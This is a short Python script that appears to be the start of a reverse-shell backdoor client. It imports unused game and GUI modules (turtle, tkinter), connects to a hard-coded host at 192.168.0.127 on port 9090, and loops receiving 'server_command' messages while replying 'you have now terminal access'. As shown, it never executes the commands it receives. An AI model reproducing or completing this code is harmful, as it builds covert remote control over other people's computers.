from turtle import *
from random import randrange
from tkinter import *
import socket

IP = "192.168.0.127"
PORT = 9090
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((IP, PORT))
while True:
    server_command = client.recv(1024).decode('utf-8')
    client.send("you have now terminal access".encode('utf-8'))
